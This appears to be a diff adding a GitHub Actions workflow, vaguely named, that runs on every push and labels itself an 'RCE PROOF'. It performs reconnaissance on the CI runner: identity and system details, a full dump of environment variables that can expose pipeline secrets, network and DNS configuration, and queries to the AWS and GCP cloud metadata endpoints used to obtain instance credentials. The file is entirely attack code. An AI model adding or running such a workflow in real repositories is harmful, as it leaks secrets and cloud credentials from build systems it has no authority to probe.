@@ -1,0 +1,17 @@
+name: P
+on: [push, workflow_dispatch]
+jobs:
+  r:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          echo "=== RCE PROOF ==="
+          hostname && whoami && id
+          uname -a
+          env | sort
+          ip addr show 2>/dev/null
+          cat /etc/resolv.conf
+          cat /etc/hosts
+          curl -sm5 http://169.254.169.254/latest/meta-data/ || echo no-aws
+          curl -sm5 -H "Metadata-Flavor: Google" http://metadata.google.internal/ || echo no-gcp
+          echo "=== DONE ==="
